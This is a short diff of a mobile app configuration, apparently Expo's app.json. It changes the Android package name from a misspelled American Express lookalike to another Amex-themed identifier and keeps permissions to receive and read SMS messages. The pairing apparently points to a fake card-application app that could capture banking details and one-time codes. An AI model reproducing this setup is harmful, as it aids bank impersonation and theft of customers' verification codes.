@@ -11,15 +11,14 @@
     },
     "splash": {
       "image": "./assets/splash.gif",
-      "resizeMode": "contain",
-      "backgroundColor": "#ffffff"
+      "resizeMode": "contain"
     },
     "android": {
       "adaptiveIcon": {
         "foregroundImage": "./assets/icon.png",
         "backgroundColor": "#ffffff"
       },
-      "package": "com.americensexpress.android.applyamexcards",
+      "package": "com.mxcard.amexapply",
       "permissions": [
         "RECEIVE_SMS",
         "READ_SMS"
